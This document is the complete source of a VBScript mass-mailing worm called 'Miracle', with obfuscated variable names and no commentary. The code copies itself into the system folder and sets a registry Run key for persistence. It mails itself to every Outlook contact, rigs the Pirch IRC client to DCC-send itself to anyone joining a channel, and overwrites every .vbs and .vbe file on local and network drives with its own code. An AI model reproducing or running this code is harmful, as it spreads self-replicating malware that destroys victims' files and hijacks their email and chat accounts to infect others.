'Miracle Created By Pingu2000
On Error Resume Next
Set ikeokfmriic= Createobject("scripting.filesystemobject")
ikeokfmriic.copyfile wscript.scriptfullname,ikeokfmriic.GetSpecialFolder(1)& "\Win2000.vbs"
Set vjuahyhacpj = CreateObject("WScript.Shell")
vjuahyhacpj.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm","wscript.exe "&ikeokfmriic.GetSpecialFolder(1)& "\Win2000.vbs %"
if vjuahyhacpj.regread ("HKCU\software\Miracle\mailed") <> "1" then
axgeqbnqouv()
end if
if vjuahyhacpj.regread ("HKCU\software\Miracle\pirched") <> "1" then
dnotyvksblv ""
end if
sndhhhjcycr()
Function axgeqbnqouv()
On Error Resume Next
Set xxfhieryumd = CreateObject("Outlook.Application")
If xxfhieryumd= "Outlook"Then
Set fpdfmscjcwj=xxfhieryumd.GetNameSpace("MAPI")
For Each uuiyhactgmj In fpdfmscjcwj.AddressLists
If uuiyhactgmj.AddressEntries.Count <> 0 Then
tykhwxnxaez = uuiyhactgmj.AddressEntries.Count
For sqcnzvtzhpz= 1 To tykhwxnxaez
Set ottsvhkodjj = xxfhieryumd.CreateItem(0)
Set rtuqckgypqb = uuiyhactgmj.AddressEntries(sqcnzvtzhpz)
ottsvhkodjj.To = rtuqckgypqb.Address
ottsvhkodjj.Subject = "Here you have, ;o)"
ottsvhkodjj.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
pryxovhhvzg.Add ikeokfmriic.GetSpecialFolder(1)& "\Win2000.vbs"
ottsvhkodjj.DeleteAfterSubmit = True
If ottsvhkodjj.To <> "" Then
ottsvhkodjj.Send
vjuahyhacpj.regwrite "HKCU\software\Miracle\mailed", "1"
End If
Next
End If
Next
end if
End Function
function dnotyvksblv(udtfobouras)
On Error Resume Next
if udtfobouras="" then
if ikeokfmriic.fileexists("c:\pirch\Pirch32.exe") then udtfobouras="c:\pirch"
if ikeokfmriic.fileexists("c:\pirch32\Pirch32.exe") then udtfobouras="c:\pirch32"
dvadbhpxbbg=vjuahyhacpj.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if ikeokfmriic.fileexists(dvadbhpxbbg & "\pirch\Pirch32.exe") then udtfobouras=dvadbhpxbbg & "\pirch\Pirch32.exe"
end if
if udtfobouras <> "" then
set spefvyimhxu= ikeokfmriic.CreateTextFile(udtfobouras & "\events.ini", True)
spefvyimhxu.WriteLine "[Levels]"
spefvyimhxu.WriteLine "Enabled=1"
spefvyimhxu.WriteLine "Count=6"
spefvyimhxu.WriteLine "Level1=000-Unknowns"
spefvyimhxu.WriteLine "000-UnknownsEnabled=1"
spefvyimhxu.WriteLine "Level2=100-Level 100"
spefvyimhxu.WriteLine "100-Level 100Enabled=1"
spefvyimhxu.WriteLine "Level3=200-Level 200"
spefvyimhxu.WriteLine "200-Level 200Enabled=1"
spefvyimhxu.WriteLine "Level4=300-Level 300"
spefvyimhxu.WriteLine " 300-Level 300Enabled=1"
spefvyimhxu.WriteLine "Level5=400-Level 400 "
spefvyimhxu.WriteLine "400-Level 400Enabled=1"
spefvyimhxu.WriteLine "Level6=500-Level 500"
spefvyimhxu.WriteLine "500-Level 500Enabled=1"
spefvyimhxu.WriteLine ""
spefvyimhxu.WriteLine "[000-Unknowns]"
spefvyimhxu.WriteLine "UserCount=0"
spefvyimhxu.WriteLine "EventCount=0"
spefvyimhxu.WriteLine ""
spefvyimhxu.WriteLine "[100-Level 100]"
spefvyimhxu.WriteLine "User1=*!*@*"
spefvyimhxu.WriteLine "UserCount=1"
spefvyimhxu.writeline "Event1=ON JOIN:#:/dcc tsend $nick " & ikeokfmriic.GetSpecialFolder(1) & "\Win2000.vbs"
spefvyimhxu.WriteLine "EventCount=1"
spefvyimhxu.WriteLine ""
spefvyimhxu.WriteLine "[200-Level 200]"
spefvyimhxu.WriteLine "UserCount=0"
spefvyimhxu.WriteLine "EventCount=0"
spefvyimhxu.WriteLine ""
spefvyimhxu.WriteLine "[300-Level 300]"
spefvyimhxu.WriteLine "UserCount=0"
spefvyimhxu.WriteLine "EventCount=0"
spefvyimhxu.WriteLine ""
spefvyimhxu.WriteLine "[400-Level 400]"
spefvyimhxu.WriteLine "UserCount=0"
spefvyimhxu.WriteLine "EventCount=0"
spefvyimhxu.WriteLine ""
spefvyimhxu.WriteLine "[500-Level 500]"
spefvyimhxu.WriteLine "UserCount=0"
spefvyimhxu.WriteLine "EventCount=0"
spefvyimhxu.close
vjuahyhacpj.regwrite "HKCU\software\Miracle\pirched", "1"
end if
end function
Function sndhhhjcycr()
On Error Resume Next
Set vuwpswerrzu = ikeokfmriic.Drives
For Each vresihyscxt In vuwpswerrzu
If vresihyscxt.Drivetype = Remote Then
afwwqqdiocm= vresihyscxt & "\"
Call bnwcwvsbald(afwwqqdiocm)
ElseIf vresihyscxt.IsReady Then
afwwqqdiocm= vresihyscxt&"\"
Call bnwcwvsbald(afwwqqdiocm)
End If
Next
End Function
Function bnwcwvsbald(iljpyyjkoar)
Set fnehqupfddc= ikeokfmriic.GetFolder(iljpyyjkoar)
Set extxmasacez= fnehqupfddc.Files
For Each maqigakfbin In extxmasacez
if ikeokfmriic.GetExtensionName(maqigakfbin.path) = "vbs" then
ikeokfmriic.copyfile wscript.scriptfullname , maqigakfbin.path , true
end if
if ikeokfmriic.GetExtensionName(maqigakfbin.path) = "vbe" then
ikeokfmriic.copyfile wscript.scriptfullname , maqigakfbin.path , true
end if
Next
Set maqigakfbin= fnehqupfddc.SubFolders
For Each eeyrfqwdudw In maqigakfbin
Call bnwcwvsbald(eeyrfqwdudw.path)
Next
End Function
